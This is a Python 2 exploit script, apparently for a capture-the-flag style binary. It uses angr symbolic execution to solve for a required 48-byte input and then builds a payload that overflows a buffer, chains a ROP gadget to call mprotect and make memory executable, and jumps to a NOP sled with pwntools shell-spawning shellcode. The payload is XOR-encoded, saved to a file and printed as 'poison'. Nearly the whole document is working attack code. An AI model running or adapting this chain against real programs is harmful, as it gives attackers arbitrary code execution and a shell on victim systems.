#!/usr/bin/env python2
import angr
import find
import sys
from pwn import *

context(arch = 'amd64')

tar = sys.argv[1]

# Find dynamic elements in file
loc = find.get_addresses(tar)

# Create symbolic buffer
p = angr.Project(tar)
buf = angr.claripy.BVS("buf",48*8)
start_state = p.factory.blank_state(addr=loc['start'])
start_state.memory.store(loc['buf'], buf)

# Setup a stack frame
start_state.regs.rbp = start_state.regs.rsp
start_state.regs.rsp = start_state.regs.rsp - 0x50
start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))

# Setup stepper
pg = p.factory.path_group(start_state)
def step_func(pg):
    print pg
    pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
    pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
    return pg
pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
print pg.errored
f = pg.found[0]
print f.state
print f.state.se.any_str(buf).encode('hex')


# FIXED

# Create killstring
cert = f.state.se.any_str(buf)
# cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
print cert.encode('hex')

mprotect = 0x400790
overflow = 0x77242B0
gadget = 0x75229ef

print '%x %x %x' % (mprotect, overflow, gadget)

mprotect = loc['plt_mprotect']
overflow = loc['buf_loc']
gadget = loc['load_gadget']

print '%x %x %x' % (mprotect, overflow, gadget)

# kill = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')

# Padding up to overflow
pad2 = 0x200
shellcode_addr = overflow + pad2
kill = cyclic(loc['overflow_size'], alphabet = 'ABCD')

# Ret to load gadget with modified RBP
pad1 = 0x100
arg_addr = overflow + loc['load_offset'] + pad1
kill += p64(arg_addr)                            # Set RBP for load gadget
kill += p64(gadget)                              # Load arguments into registers
kill += p64(shellcode_addr)

# Prep mprotect arguments
kill += cyclic(pad1 - len(kill))
kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
kill += p64(0x1337)
kill += p64(0x1337)
kill += p64(0x1000)                               # RSI
kill += p64(0x7)                                  # RDX

# Run mprotect
kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
kill += p64(shellcode_addr & 0xFFFFFFFFFFFFF000)  # RDI
kill += p64(overflow + 0x300)
kill += p64(mprotect)
kill += p64(shellcode_addr)
kill += '\x90' * (pad2 - len(kill))
kill += asm(shellcraft.sh())

kill_str = xor(cert + kill, loc['pad'], cut = 'max')

write('gdbinit', '''
        b *0x56381EA
        b *0x56381F0
        r
''')
write('sploit', kill_str.encode('hex'))
# p = process([tar, kill_str.encode('hex')])


print 'Here is some poison:'
print kill_str.encode('hex')
